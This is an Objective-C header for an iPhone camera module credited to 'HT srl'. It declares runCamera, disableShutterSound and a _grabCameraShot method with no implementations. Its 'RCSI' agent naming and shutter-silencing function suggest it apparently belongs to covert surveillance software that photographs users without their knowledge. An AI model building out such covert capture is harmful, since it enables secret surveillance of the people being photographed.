//
//  RCSIAgentCamera.h
//  iPhoneCameraTest
//
//  Created by kiodo on 02/12/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>
extern "C" {
  NSData* runCamera(NSInteger frontRear); 
  void disableShutterSound();

}

@interface CameraSupport : NSObject
{
  NSThread  *mCurrThread;
}

@property (readwrite, retain) NSThread  *mCurrThread;

- (NSData*)_grabCameraShot: (NSInteger)aPosition;

@end
